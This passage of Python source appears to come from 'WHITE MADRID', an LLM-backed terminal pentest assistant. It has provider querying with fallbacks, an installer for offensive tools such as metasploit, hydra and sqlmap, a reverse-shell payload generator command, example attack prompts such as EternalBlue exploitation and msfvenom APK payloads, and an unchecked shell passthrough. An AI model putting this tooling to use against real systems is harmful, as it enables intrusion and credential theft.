            lambda d: d["message"],
            lambda d: d["detail"],
            lambda d: d["errors"][0]["message"],
        ]:
            try:
                msg = path(data)
                if msg: return f"HTTP {e.code}: {str(msg)[:220]}"
            except: pass
        return f"HTTP {e.code}: {body[:200]}"
    except:
        return f"HTTP {e.code}: {raw_err[:100]}"

def query_ai(prompt, cfg, history, retry=True):
    provider = cfg.get("provider", DEFAULT_PROVIDER)
    model    = cfg.get("model",    DEFAULT_MODEL)
    operator = cfg.get("operator", "Operator")
    api_key  = get_key(cfg, provider)

    if not api_key:
        return "", f"No API key for '{provider}'. Run: setkey {provider}"

    pd  = API_PROVIDERS.get(provider, API_PROVIDERS["openrouter"])
    fmt = pd["format"]

    # Teaching mode: simplify system prompt for newcomers
    teaching = cfg.get("teaching_mode", False)

    try:
        url, headers, payload = build_request(
            prompt, api_key, provider, model, history, operator, teaching
        )
        data_bytes = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            url, data=data_bytes, headers=headers, method="POST"
        )
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read()
            enc = r.headers.get("Content-Encoding", "")
            if enc in ("gzip","br"):
                raw = _decompress(raw)
            elif enc == "deflate":
                import zlib as _zl
                try: raw = _zl.decompress(raw)
                except: raw = _zl.decompressobj(-15).decompress(raw)
            data = _safe_json(raw)
            text = parse_response(data, fmt)
            if not text or not text.strip():
                return "", "Empty response from model. Try a different model or provider."
            return text, None

    except urllib.error.HTTPError as e:
        raw_err = e.read()
        err_msg = _extract_error(e, raw_err)
        # Auto-retry with free fallback on: model unavailable (404), credits (402), rate limit (429)
        retryable_codes = (402, 404, 429)
        if retry and e.code in retryable_codes and provider == "openrouter":
            # Always try the auto-router first — it never goes stale
            fallback_chain = ["openrouter/free"] + [
                m for m,_ in API_PROVIDERS["openrouter"]["free"] if m != "openrouter/free"
            ]
            for fallback in fallback_chain:
                if model != fallback:
                    cfg_tmp = dict(cfg); cfg_tmp["model"] = fallback
                    resp, err2 = query_ai(prompt, cfg_tmp, history, retry=False)
                    if not err2:
                        # Persist the working model so we don't hit this again
                        cfg["model"] = fallback
                        save_config(cfg)
                        return resp, None
            if e.code == 404:
                return "", "Model unavailable and all free fallbacks failed. Try: provider groq"
            return "", "All free models exhausted. Add credits or try: provider groq"
        return "", err_msg

    except urllib.error.URLError as e:
        reason = str(e.reason)
        if "SSL" in reason or "certificate" in reason.lower():
            return "", f"SSL error: {reason}. Try: provider groq"
        return "", f"Network error: {reason}"

    except json.JSONDecodeError as e:
        return "", f"JSON parse error: {e}. Provider may be down."

    except Exception as e:
        return "", f"Unexpected error: {type(e).__name__}: {e}"

# ══════════════════════════════════════════════════════
#  RESPONSE FORMATTER
# ══════════════════════════════════════════════════════
def format_response(text):
    w=twidth(); lines=text.split("\n")
    in_code=False; code_buf=[]; lang="shell"; out=[]
    for line in lines:
        if line.startswith("```"):
            if not in_code:
                in_code=True; lang=line[3:].strip() or "shell"; code_buf=[]
            else:
                out.append(c(C.GRAY,f"  ┌─[{lang}]"+"─"*max(0,w-10-len(lang))))
                for cl in code_buf:
                    pfx=c(C.GRAY,"  │ ")
                    out.append(pfx+(c(C.GREEN,cl) if cl.strip().startswith(("$","#",">>")) else c(C.WHITE,cl)))
                out.append(c(C.GRAY,"  └"+"─"*(w-5)))
                in_code=False; code_buf=[]
            continue
        if in_code: code_buf.append(line); continue
        s=line.strip()
        if not s: out.append(""); continue
        if s.startswith("[+]"):   out.append(f"  {c(C.GREEN+C.BOLD,'[+]')}{c(C.GREEN,s[3:])}")
        elif s.startswith("[-]"): out.append(f"  {c(C.RED+C.BOLD,'[-]')}{c(C.RED,s[3:])}")
        elif s.startswith("[!]"): out.append(f"  {c(C.YELLOW+C.BOLD,'[!]')}{c(C.YELLOW,s[3:])}")
        elif s.startswith("[*]"): out.append(f"  {c(C.BLUE+C.BOLD,'[*]')}{c(C.BLUE,s[3:])}")
        elif s.startswith("▸"):
            k,_,r=s.partition(":")
            out.append(f"\n  {c(C.MAGENTA+C.BOLD,k+':')} {c(C.WHITE,r.strip())}")
        elif re.match(r'^\[MODE:',s): out.append(f"\n  {c(C.CYAN+C.BOLD,s)}")
        elif re.match(r'^#{1,3} ',s):
            h=re.sub(r'^#{1,3} ','',s); sep=c(C.CYAN,"━"*(w-4))
            out.append(f"\n  {sep}\n  {c(C.WHITE+C.BOLD,'▶ '+h)}\n  {sep}")
        elif s.startswith(("- ","* ","• ")): out.append(f"    {c(C.CYAN,'›')} {s[2:]}")
        elif re.match(r'^\d+\.',s):
            num,_,rest=s.partition("."); out.append(f"    {c(C.YELLOW+C.BOLD,num+'.')} {rest.strip()}")
        else:
            w2=textwrap.fill(line,width=w-4,initial_indent="  ",subsequent_indent="  ")
            w2=re.sub(r'`([^`]+)`',lambda m:c(C.YELLOW,m.group(1)),w2)
            w2=re.sub(r'\*\*([^*]+)\*\*',lambda m:c(C.WHITE+C.BOLD,m.group(1)),w2)
            out.append(w2)
    return "\n".join(out)

# ══════════════════════════════════════════════════════
#  TOOL MANAGER
# ══════════════════════════════════════════════════════
TOOL_CATALOGUE = {
    "nmap":        ("nmap",               "recon",     "Network port scanner",           "nmap --version"),
    "masscan":     ("masscan",            "recon",     "High-speed port scanner",        "masscan --version"),
    "dnsrecon":    ("dnsrecon",           "recon",     "DNS enumeration",                "dnsrecon --help"),
    "whois":       ("whois",              "recon",     "Domain lookup",                  "whois --version"),
    "curl":        ("curl",               "recon",     "HTTP tool",                      "curl --version"),
    "wget":        ("wget",               "recon",     "File download",                  "wget --version"),
    "nikto":       ("nikto",              "web",       "Web vuln scanner",               "nikto -Version"),
    "sqlmap":      ("sqlmap",             "web",       "SQL injection tool",             "sqlmap --version"),
    "gobuster":    ("gobuster",           "web",       "Dir/DNS brute-forcer",           "gobuster version"),
    "ffuf":        ("ffuf",               "web",       "Web fuzzer",                     "ffuf -V"),
    "hydra":       ("hydra",              "password",  "Online brute-force",             "hydra -h"),
    "john":        ("john",               "password",  "Hash cracker",                   "john --list=formats"),
    "hashcat":     ("hashcat",            "password",  "GPU hash cracking",              "hashcat --version"),
    "crunch":      ("crunch",             "password",  "Wordlist generator",             "crunch --help"),
    "netcat":      ("netcat-openbsd",     "network",   "TCP/UDP Swiss knife",            "nc -h"),
    "socat":       ("socat",              "network",   "Advanced relay",                 "socat -V"),
    "tcpdump":     ("tcpdump",            "network",   "Packet capture",                 "tcpdump --version"),
    "hping3":      ("hping3",             "network",   "Packet crafting",                "hping3 --version"),
    "iperf3":      ("iperf3",             "network",   "Bandwidth testing",              "iperf3 --version"),
    "metasploit":  ("metasploit",         "exploit",   "Exploitation framework",         "msfconsole --version"),
    "exploitdb":   ("exploitdb",          "exploit",   "Exploit-DB + searchsploit",      "searchsploit --version"),
    "aircrack-ng": ("aircrack-ng",        "wireless",  "WEP/WPA auditing",               "aircrack-ng --version"),
    "bettercap":   ("bettercap",          "wireless",  "Network attack framework",       "bettercap -v"),
    "binwalk":     ("binwalk",            "forensics", "Binary analysis",                "binwalk --help"),
    "steghide":    ("steghide",           "forensics", "Steganography",                  "steghide --version"),
    "foremost":    ("foremost",           "forensics", "File carving",                   "foremost -h"),
    "python":      ("python",             "utility",   "Python 3 runtime",               "python3 --version"),
    "git":         ("git",                "utility",   "Version control",                "git --version"),
    "tmux":        ("tmux",               "utility",   "Terminal multiplexer",           "tmux -V"),
    "openssh":     ("openssh",            "utility",   "SSH client",                     "ssh -V"),
    "openssl":     ("openssl",            "utility",   "Crypto toolkit",                 "openssl version"),
}
CATEGORIES = {
    "recon":    ("🔍",C.CYAN,   "Reconnaissance & OSINT"),
    "web":      ("🌐",C.BLUE,   "Web Application Testing"),
    "password": ("🔑",C.YELLOW, "Password Attacks"),
    "network":  ("📡",C.GREEN,  "Network Tools"),
    "exploit":  ("💥",C.RED,    "Exploitation Frameworks"),
    "wireless": ("📶",C.MAGENTA,"Wireless Security"),
    "forensics":("🔬",C.DCYAN,  "Forensics & Crypto"),
    "utility":  ("⚙️ ",C.GRAY,  "Utilities"),
}

def tool_installed(vcmd):
    try: return subprocess.run(vcmd.split(),capture_output=True,timeout=5).returncode in (0,1)
    except: return False

def install_tool(key):
    if key not in TOOL_CATALOGUE:
        _wm_say(f"'{key}' not in catalogue. Use 'tools' to browse.",col=C.RED); return False
    pkg,cat,desc,vcmd=TOOL_CATALOGUE[key]; pm=detect_pm()
    if not pm: _wm_say("No package manager found.",col=C.RED); return False
    _wm_say(f"Installing {key} — {desc}",col=C.CYAN)
    cmds={"pkg":f"pkg install -y {pkg}","apt":f"sudo apt install -y {pkg}",
          "pacman":f"sudo pacman -S --noconfirm {pkg}","dnf":f"sudo dnf install -y {pkg}"}
    cmd=cmds.get(pm,f"sudo apt install -y {pkg}")
    specials={("metasploit","pkg"):"pkg install unstable-repo -y && pkg install metasploit -y",
              ("gobuster","pkg"):"pkg install golang -y && go install github.com/OJ/gobuster/v3@latest",
              ("ffuf","pkg"):"pkg install golang -y && go install github.com/ffuf/ffuf/v2@latest"}
    cmd=specials.get((key,pm),cmd)
    if key=="sqlmap": cmd=f"pip install sqlmap --break-system-packages 2>/dev/null || {cmd}"
    ret=os.system(cmd)
    if ret==0: _wm_say(f"{key} installed successfully.",col=C.GREEN); return True
    else: _wm_say(f"Failed (exit {ret}). Try manually: {cmd}",col=C.RED); return False

def print_tool_list():
    print()
    for cat_id,(icon,col,cat_name) in CATEGORIES.items():
        shown=False
        for key,(pkg,cat,desc,vcmd) in TOOL_CATALOGUE.items():
            if cat!=cat_id: continue
            if not shown: print(c(col+C.BOLD,f"\n  {icon} {cat_name}")); shown=True
            ok=tool_installed(vcmd)
            st=c(C.GREEN,"✔") if ok else c(C.GRAY,"·")
            print(f"  {st} {c(C.WHITE+C.BOLD,key):<22}{c(C.GRAY,desc)}")
    print()
    print(c(C.GRAY,"  install <name>  |  install  (menu)"))
    print()

def check_tools():
    _wm_say("Scanning tool inventory...",col=C.CYAN)
    ok_l,miss_l=[],[]
    for key,(_,_,_,vcmd) in TOOL_CATALOGUE.items():
        (ok_l if tool_installed(vcmd) else miss_l).append(key)
    n=len(TOOL_CATALOGUE); pct=int(len(ok_l)/n*100)
    print()
    print(c(C.GREEN, f"  [+] Installed ({len(ok_l)}/{n}):  ")+c(C.GREEN,"  ".join(ok_l)))
    print(c(C.GRAY,  f"\n  [-] Missing  ({len(miss_l)}):  ")+c(C.GRAY, "  ".join(miss_l)))
    bl=40; fi=int(bl*pct/100)
    bar=c(C.GREEN,"█"*fi)+c(C.GRAY,"░"*(bl-fi))
    col=C.GREEN if pct>=80 else C.YELLOW if pct>=40 else C.RED
    print(f"\n  Coverage [{bar}] {c(col+C.BOLD,str(pct)+'%')}\n")

def interactive_installer():
    print()
    _wm_say("Arsenal Installer — choose a suite:",col=C.CYAN)
    print()
    opts=[
        ("1","Full arsenal",     list(TOOL_CATALOGUE.keys())),
        ("2","Recon & OSINT",    [k for k,v in TOOL_CATALOGUE.items() if v[1]=="recon"]),
        ("3","Web application",  [k for k,v in TOOL_CATALOGUE.items() if v[1]=="web"]),
        ("4","Password attacks", [k for k,v in TOOL_CATALOGUE.items() if v[1]=="password"]),
        ("5","Network tools",    [k for k,v in TOOL_CATALOGUE.items() if v[1]=="network"]),
        ("6","Exploitation",     [k for k,v in TOOL_CATALOGUE.items() if v[1]=="exploit"]),
        ("7","Forensics",        [k for k,v in TOOL_CATALOGUE.items() if v[1]=="forensics"]),
        ("8","Utilities",        [k for k,v in TOOL_CATALOGUE.items() if v[1]=="utility"]),
        ("9","Single tool",      []),
        ("0","Cancel",           []),
    ]
    for num,label,tools in opts:
        col=C.RED if num=="1" else C.GRAY if num=="0" else C.GREEN
        cnt=f" ({len(tools)})" if tools else ""
        sys.stdout.write(f"  {c(col+C.BOLD,'['+num+']')} {label}{c(C.GRAY,cnt)}\n")
        sys.stdout.flush(); time.sleep(0.03)
    print()
    try:    choice=input(c(C.WHITE+C.BOLD,"  Select: ")).strip()
    except: print(); return
    targets=[]
    for num,label,tools in opts:
        if choice==num:
            if num=="0": return
            if num=="9":
                try: t=input(c(C.WHITE,"  Tool name: ")).strip().lower()
                except: print(); return
                targets=[t] if t in TOOL_CATALOGUE else []
                if not targets: _wm_say(f"'{t}' not found.",col=C.RED); return
            else: targets=tools; break
    if not targets: _wm_say("Nothing selected.",col=C.YELLOW); return
    _wm_say(f"Queued {len(targets)} tool(s): {', '.join(targets)}",col=C.YELLOW)
    try:    confirm=input(c(C.WHITE,"  Confirm? [y/N]: ")).strip().lower()
    except: print(); return
    if confirm!="y": _wm_say("Aborted.",col=C.GRAY); return
    ok=fail=0
    for t in targets:
        if install_tool(t): ok+=1
        else: fail+=1
    print()
    _wm_say(f"Done. {c(C.GREEN,str(ok)+' installed')}  {c(C.RED,str(fail)+' failed')}",col=C.CYAN)
    print()

# ══════════════════════════════════════════════════════
#  HELP & INFO
# ══════════════════════════════════════════════════════
def print_help():
    w=twidth(); B=C.CYAN+C.BOLD
    print()
    print(c(B,"  ╔"+"═"*(w-4)+"╗"))
    print(c(B,"  ║")+c(C.WHITE+C.BOLD,"  WHITE MADRID v6.0 — Command Reference".center(w-4))+c(B,"║"))
    print(c(B,"  ╠"+"═"*(w-4)+"╣"))
    secs=[
        ("AI ASSISTANT",[
            ("ask anything",        "Type naturally — JARVIS responds with full animation"),
            ("explain <topic>",     "Deep-dive explanation of any security concept"),
            ("suggest",             "Proactive next-step recommendations"),
            ("recap",               "Summarize this session"),
            ("mode <name>",         "Set mode: recon/exploit/stealth/ctf/learn/defend/crisis"),
        ]),
        ("BUILT-IN TOOLS",[
            ("hashid <hash>",       "Identify hash type (MD5/SHA1/bcrypt/NTLM etc.)"),
            ("payload <ip> <port> [type]","Generate reverse shell payload"),
            ("payloads",            "List all payload types"),
            ("encode <mode> <data>","Encode/decode/hash data"),
            ("encoders",            "List encode modes: b64e b64d urlenc urldec hex md5 sha256"),
            ("note add <text>",     "Save a note to session"),
            ("note list",           "Show saved notes"),
            ("note clear",          "Clear all notes"),
        ]),
        ("API MANAGEMENT",[
            ("apis",                "Browse all 9 providers — free & paid models"),
            ("provider <name>",     "Switch provider  e.g. provider groq"),
            ("model <name>",        "Switch model     e.g. model llama-3.1-8b-instant"),
            ("setkey <provider>",   "Set API key      e.g. setkey groq"),
            ("freemode",            "Auto-select best free model"),
            ("keys",                "Show all configured keys (masked)"),
        ]),
        ("TERMINAL",[
            ("help",                "This reference"),
            ("clear",               "Clear & redraw banner"),
            ("about",               "System info"),
            ("history",             "Session query log"),
            ("log",                 "Save session to file"),
            ("topics",              "Example pentest queries"),
            ("operator <name>",     "Set operator name"),
            ("netcheck",            "Test internet connectivity"),
            ("exit / q",            "Quit WHITE MADRID"),
        ]),
        ("TOOL MANAGER",[
            ("tools",               "List all pentest tools with status"),
            ("install",             "Interactive installer"),
            ("install <name>",      "Install specific tool"),
            ("check",               "Scan installed tools + coverage %"),
        ]),
        ("TEACHING & LEARNING",[
            ("teach",               "Beginner topic menu — step-by-step learning"),
            ("teaching on/off",     "Toggle teaching mode (simple explanations)"),
            ("expert",              "Switch to expert mode"),
            ("explain <topic>",     "Deep dive on any concept"),
        ]),
        ("SCAMMER REPORTER",[
            ("report",              "Report Instagram scammer via official channels"),
        ]),
        ("MODEL TESTING",[
            ("testmodels",          "Test all configured providers — see which are online"),
        ]),
        ("QUICK START",[
            ("qs / quickstart",     "Simple quick-start guide — what to do first"),
        ]),
        ("RELAX / IDLE",[
            ("relax",               "Chill mode — trivia, games, jokes, wisdom"),
            ("joke",                "Random hacker joke"),
            ("wisdom",              "Hacker wisdom quote"),
            ("trivia",              "Security trivia question"),
        ]),
        ("SHELL",[
            ("!<cmd>",              "Run shell command  e.g. !nmap -sV 10.0.0.1"),
            ("!cd <path>",          "Change working directory"),
        ]),
    ]
    for sec,cmds in secs:
        pad=w-4-len(sec)-2
        print(c(B,"  ║"))
        print(c(B,"  ║")+c(C.YELLOW+C.BOLD,f"  {sec}")+" "*max(0,pad)+c(B,"║"))
        for cmd,desc in cmds:
            rpad=max(0,w-6-len(cmd)-len(desc)-5)
            print(c(B,"  ║")+f"    {c(C.GREEN+C.BOLD,cmd):<32} {c(C.GRAY,desc)}"+" "*rpad+c(B,"║"))
    print(c(B,"  ║"))
    print(c(B,"  ╚"+"═"*(w-4)+"╝"))
    print()

def print_about(cfg):
    w=min(twidth(),72); B=C.MAGENTA; si=sysinfo()
    prov=cfg.get("provider",DEFAULT_PROVIDER)
    print()
    print(c(B,"  ╔"+"═"*(w-4)+"╗"))
    print(c(B,"  ║")+c(C.WHITE+C.BOLD,"  WHITE MADRID — System Info".center(w-4))+c(B,"║"))
    print(c(B,"  ╠"+"═"*(w-4)+"╣"))
    rows=[
        ("AI Name",    "WHITE MADRID",                              C.CYAN),
        ("Version",    f"{VERSION} — {CODENAME}",                   C.GREEN),
        ("Developer",  DEVELOPER,                                   C.CYAN),
        ("Provider",   API_PROVIDERS.get(prov,{}).get("name",prov), C.YELLOW),
        ("Model",      cfg.get("model",DEFAULT_MODEL)[:40],         C.YELLOW),
        ("Operator",   cfg.get("operator","Unknown"),                C.WHITE),
        ("Sessions",   str(cfg.get("session_count","?")),           C.GRAY),
        ("Platform",   "Termux/Android" if is_termux() else "Linux/macOS", C.GRAY),
        ("Host",       si.get("host","?"),                          C.GRAY),
        ("Providers",  f"{len(API_PROVIDERS)} configured",          C.GRAY),
        ("Built-in",   "hash-id · payload-gen · encoder · notes",   C.GRAY),
        ("Date",       date_str(),                                  C.GRAY),
    ]
    for label,val,vc in rows:
        ll=len(label)+len(val)+8; pad=max(0,w-4-ll)
        print(c(B,"  ║")+f"  {c(C.GRAY+C.BOLD,label+':')}  {c(vc,val)}"+" "*pad+c(B,"║"))
    print(c(B,"  ╚"+"═"*(w-4)+"╝"))
    print()

def print_keys(cfg):
    print(c(C.CYAN+C.BOLD,"\n  [WM] Configured API Keys:\n"))
    for pid,pd in API_PROVIDERS.items():
        key=get_key(cfg,pid)
        if key:
            masked=key[:8]+"*"*(len(key)-12)+key[-4:] if len(key)>12 else "****"
            print(f"  {c(C.GREEN,'✔')} {c(C.WHITE+C.BOLD,pd['name']):<22} {c(C.GRAY,masked)}")
        else:
            print(f"  {c(C.GRAY,'·')} {c(C.GRAY,pd['name']):<22} {c(C.RED,'not set')}  {c(C.BLUE,pd['key_url'])}")
    print()

def print_topics():
    cats=[
        ("🔍 Recon",    C.CYAN, [
            "Scan 192.168.1.0/24 with nmap for all open ports and services",
            "Enumerate subdomains of target.com with amass and theHarvester",
            "Perform a DNS zone transfer attack",
        ]),
        ("🌐 Web",      C.BLUE, [
            "Test login form for SQL injection with sqlmap, bypass WAF",
            "Brute-force web directories with gobuster on port 443",
            "Explain SSRF vulnerability and show exploitation steps",
        ]),
        ("💥 Exploit",  C.RED, [
            "Set up Metasploit reverse shell handler for Windows target",
            "Generate msfvenom Android APK payload",
            "Exploit EternalBlue MS17-010 step by step",
        ]),
        ("🔑 Passwords",C.YELLOW,[
            "Crack this hash: 5f4dcc3b5aa765d61d8327deb882cf99",
            "Brute-force SSH login with Hydra",
            "Kerberoasting attack — explain and demonstrate",
        ]),
        ("⬆ PrivEsc",   C.GREEN,[
            "Full Linux privilege escalation checklist",
            "Windows token impersonation with PrintSpoofer",
            "Exploit a writable cron job for root",
        ]),
        ("🏁 CTF",      C.MAGENTA,[
            "Check a jpg file for hidden steganography",
            "Analyze a .pcap file for credentials",
            "RSA CTF — given n, e, c — decrypt the message",
        ]),
    ]
    print()
    print(c(C.CYAN+C.BOLD,"  [WM] Example queries — just type these:\n"))
    for cat,col,items in cats:
        print(c(col+C.BOLD,f"  {cat}"))
        for item in items: print(f"    {c(C.GRAY,'›')} {item}")
        print()

def save_session_log(session):
    try:
        with open(LOG_FILE,"a") as f:
            f.write(f"\n{'='*60}\nWHITE MADRID — {date_str()} {now_str()}\n{'='*60}\n")
            for role,text in session: f.write(f"\n[{role.upper()}]\n{text}\n")
        _wm_say(f"Session saved → {LOG_FILE}",col=C.GREEN)
    except Exception as e: _wm_say(f"Save failed: {e}",col=C.RED)

# ══════════════════════════════════════════════════════
#  READLINE
# ══════════════════════════════════════════════════════
def setup_readline():
    try: readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError: pass
    readline.set_history_length(2000)

def save_readline():
    try: readline.write_history_file(HISTORY_FILE)
    except: pass

def build_prompt(cfg,mode=""):
    prov  = cfg.get("provider",DEFAULT_PROVIDER)
    pname = API_PROVIDERS.get(prov,{}).get("name",prov)[:8]
    op    = cfg.get("operator","OP")[:12]
    mt    = f"─[{c(C.YELLOW,mode)}]" if mode else ""
    return (
        c(C.GRAY,"\n  ╭─[")+c(C.WHITE+C.BOLD,"WM")+c(C.GRAY,"]─[")+
        c(C.CYAN,op)+c(C.GRAY,"]─[")+c(C.MAGENTA,pname)+c(C.GRAY,"]")+mt+
        c(C.GRAY,"─[")+c(C.GRAY,now_str())+c(C.GRAY,"]\n  ╰─")+
        c(C.GREEN+C.BOLD,"▶ ")
    ) if TTY else "\n[WM]> "

# ══════════════════════════════════════════════════════
#  ERROR HANDLER
# ══════════════════════════════════════════════════════
def handle_error(error, cfg):
    _wm_say(f"Error: {error}",col=C.RED)
    e=error.lower()
    if "403" in error or "1010" in error or "cloudflare" in e or "ray id" in e:
        _wm_say("Cloudflare is blocking the request.",col=C.YELLOW,delay=SPEED_FAST)
        _wm_say("Fix: provider groq  OR  provider gemini  OR  provider cohere",col=C.GRAY,delay=SPEED_FAST)
    elif "key" in e or "auth" in e or "401" in error or "403" in error:
        prov2=cfg.get("provider",DEFAULT_PROVIDER)
        _wm_say(f"Auth failed. Run: setkey {prov2}",col=C.YELLOW,delay=SPEED_FAST)
    elif "credits" in e or "afford" in e or "quota" in e or "limit" in e or "billing" in e:
        _wm_say("Out of credits. Options: freemode  |  provider groq  |  provider gemini",col=C.YELLOW,delay=SPEED_FAST)
    elif "timeout" in e or "network" in e or "connection" in e or "urlopen" in e:
        _wm_say("Network issue. Run 'netcheck' to diagnose.",col=C.YELLOW,delay=SPEED_FAST)
    elif "model" in e or "404" in error:
        prov3 = cfg.get("provider",DEFAULT_PROVIDER)
        _wm_say(f"Model unavailable — provider deprecated this slug.",col=C.YELLOW,delay=SPEED_FAST)
        if prov3 == "openrouter":
            _wm_say("Auto-fixed: switching to 'openrouter/free' (always works). Try your question again.",col=C.GREEN,delay=SPEED_FAST)
            cfg["model"] = "openrouter/free"
            save_config(cfg)
        else:
            _wm_say("Run 'apis' to see current models, or 'freemode' to reset.",col=C.GRAY,delay=SPEED_FAST)
    elif "utf" in e or "decode" in e or "codec" in e:
        _wm_say("Encoding error — already handled automatically. Retrying...",col=C.YELLOW,delay=SPEED_FAST)
    print()

# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════
def main():
    cfg = load_config()
    boot_sequence(cfg)

    prov    = cfg.get("provider",DEFAULT_PROVIDER)
    api_key = get_key(cfg,prov)
    if not api_key:
        pd=API_PROVIDERS.get(prov,{})
        _wm_say(f"No API key for {pd.get('name',prov)}.",col=C.YELLOW)
        _wm_say(f"Get free key: {pd.get('key_url','')}",col=C.GRAY,delay=SPEED_FAST)
        _wm_say("Or switch: provider groq",col=C.GRAY,delay=SPEED_FAST)
        print()
        try:    key=input(c(C.GREEN+C.BOLD,"  ▶ Enter API key (or Enter to skip): ")).strip()
        except: key=""
        if key:
            cfg.setdefault("api_keys",{})[prov]=key
            save_config(cfg)
            _wm_say(f"Key saved for {pd.get('name',prov)}.",col=C.GREEN)
            print()

    pname=API_PROVIDERS.get(cfg.get("provider",DEFAULT_PROVIDER),{}).get("name","?")
    _wm_say(f"Online  ·  {pname}  ·  {cfg.get('model',DEFAULT_MODEL)[:40]}",col=C.GREEN,delay=SPEED_FAST)
    print()

    setup_readline()
    ai_history=[]; session=[]; full_log=[]; mode=""

    while True:
        try:    raw=input(build_prompt(cfg,mode)).strip()
        except KeyboardInterrupt:
            print(); _wm_say("^C — use 'exit' to quit.",col=C.GRAY,delay=SPEED_FAST); continue
        except EOFError:
            print(); _wm_say(random.choice(EXIT_LINES),col=C.GREEN,delay=SPEED_FAST); break

        if not raw: continue
        cmd=raw.lower().strip()

        # Shell passthrough
        if raw.startswith("!"):
            sc=raw[1:].strip()
            if sc.startswith("cd "):
                try: os.chdir(os.path.expanduser(sc[3:])); _wm_say(f"cwd: {os.getcwd()}",col=C.GREEN,delay=SPEED_FAST)
                except Exception as ex: _wm_say(str(ex),col=C.RED,delay=SPEED_FAST)
            else: os.system(sc)
            continue

        # ── Built-in commands ──────────────────────────
        if cmd in ("exit","quit","q","bye","shutdown"):
            print(); _wm_say(random.choice(EXIT_LINES),col=C.GREEN+C.BOLD,delay=SPEED_NORMAL)
            save_readline(); break

        elif cmd=="clear":          clr(); boot_sequence(cfg); continue
        elif cmd in ("help","?"):   print_help(); continue
        elif cmd in ("qs","quickstart","start","menu"): print_quickstart(cfg); continue
        elif cmd=="about":          print_about(cfg); continue
        elif cmd in ("apis","providers","api"): print_apis(cfg); continue
        elif cmd in ("relax","chill","break","idle","game","games","fun"): relax_mode(cfg.get("operator","Operator")); continue
        elif cmd=="joke":           _tell_joke(); continue
        elif cmd=="wisdom":         _share_wisdom(); continue
        elif cmd=="trivia":         _play_trivia(); continue
        elif cmd=="topics":         print_topics(); continue
        elif cmd=="tools":          print_tool_list(); continue
        elif cmd=="check":          check_tools(); continue
        elif cmd=="install":        interactive_installer(); continue
        elif cmd.startswith("install "): install_tool(cmd.split("install ",1)[1].strip()); continue
        elif cmd=="keys":           print_keys(cfg); continue
        elif cmd=="freemode":       cfg=set_free_mode(cfg); continue
        elif cmd=="log":            save_session_log(session); continue
        elif cmd in ("report","scam","scammer","ig","instagram"): instagram_reporter(); continue
        elif cmd in ("teach","teaching","learn","beginner","newbie","tutorial"):
            cfg=teaching_menu(cfg)
            # Show beginner topic picker
            try:    t_in=input(c(C.GREEN+C.BOLD,"  pick# or question▶ ")).strip()
            except: print(); continue
            if t_in.lower() in ("expert","off","exit","back"): cfg=toggle_teaching(cfg,False); continue
            if t_in.isdigit():
                idx=int(t_in)-1
                if 0<=idx<len(BEGINNER_TOPICS): raw=BEGINNER_TOPICS[idx][0]
                else: _wm_say("Pick 1-15.",col=C.YELLOW,delay=SPEED_FAST); continue
            else: raw=t_in
            # fall through to AI query
        elif cmd=="teaching on" or cmd=="teaching":  cfg=toggle_teaching(cfg,True); continue
        elif cmd=="teaching off" or cmd=="expert":   cfg=toggle_teaching(cfg,False); continue
        elif cmd in ("testmodels","test","pingall","modeltest"): test_all_models(cfg); continue
        elif cmd=="payloads":
            print()
            _wm_say(f"Available payload types:",col=C.CYAN)
            for t in SHELL_PAYLOADS: print(f"    {c(C.GREEN,t)}")
            print()
            _wm_say("Usage: payload <ip> <port> [type]   e.g. payload 10.10.10.1 4444 python",col=C.GRAY,delay=SPEED_FAST)
            print(); continue
        elif cmd=="encoders":
            print()
            _wm_say("Encode/decode modes:",col=C.CYAN)
            modes=[("b64e","base64 encode"),("b64d","base64 decode"),
                   ("urlenc","url encode"),("urldec","url decode"),
                   ("hex","hex encode"),("unhex","hex decode"),
                   ("md5","MD5 hash"),("sha1","SHA-1 hash"),("sha256","SHA-256 hash")]
            for m,d in modes: print(f"    {c(C.GREEN,m):<10} {c(C.GRAY,d)}")
            print()
            _wm_say("Usage: encode <mode> <data>   e.g. encode b64e hello world",col=C.GRAY,delay=SPEED_FAST)
            print(); continue
        elif cmd=="netcheck":
            _wm_say("Checking connectivity...",col=C.CYAN,delay=SPEED_FAST)
            if net_check(): _wm_say("Network OK. Internet reachable.",col=C.GREEN,delay=SPEED_FAST)
            else: _wm_say("No connectivity. Check WiFi/data.",col=C.RED,delay=SPEED_FAST)
            print(); continue

        elif cmd.startswith("hashid "):
            identify_hash(raw.split("hashid ",1)[1].strip()); continue

        elif cmd.startswith("payload "):
            parts=raw.split(); ip=parts[1] if len(parts)>1 else ""
            port=parts[2] if len(parts)>2 else "4444"
            stype=parts[3] if len(parts)>3 else "bash"
            if ip: gen_payload(ip,port,stype)
            else: _wm_say("Usage: payload <ip> <port> [type]",col=C.YELLOW)
            continue

        elif cmd.startswith("encode "):
            parts=raw.split(None,2)
            if len(parts)<3: _wm_say("Usage: encode <mode> <data>",col=C.YELLOW); continue
            encode_decode(parts[2],parts[1].lower()); continue

        elif cmd.startswith("note"):
            parts=raw.split(None,2)
            action=parts[1].lower() if len(parts)>1 else "list"
            text=parts[2] if len(parts)>2 else ""
            notes_cmd(action,text); continue

        elif cmd.startswith("provider "):
            cfg=switch_provider(cfg,cmd.split("provider ",1)[1].strip()); continue

        elif cmd.startswith("model "):
            nm=raw.split("model ",1)[1].strip()
            cfg["model"]=nm; save_config(cfg)
            _wm_say(f"Model → {nm}",col=C.GREEN,delay=SPEED_FAST); print(); continue

        elif cmd.startswith("setkey"):
            parts=cmd.split()
            tp=parts[1] if len(parts)>1 else cfg.get("provider",DEFAULT_PROVIDER)
            if tp not in API_PROVIDERS:
                _wm_say(f"Unknown provider. Options: {', '.join(API_PROVIDERS.keys())}",col=C.RED); continue
            pd=API_PROVIDERS[tp]
            _wm_say(f"Get key at: {pd['key_url']}",col=C.GRAY,delay=SPEED_FAST)
            try: k=input(c(C.WHITE,f"  {pd['name']} API key: ")).strip()
            except: print(); continue
            if k:
                cfg.setdefault("api_keys",{})[tp]=k; save_config(cfg)
                _wm_say(f"Key saved for {pd['name']}.",col=C.GREEN,delay=SPEED_FAST)
            print(); continue

        elif cmd.startswith("operator "):
            name=raw.split("operator ",1)[1].strip()
            cfg["operator"]=name; save_config(cfg)
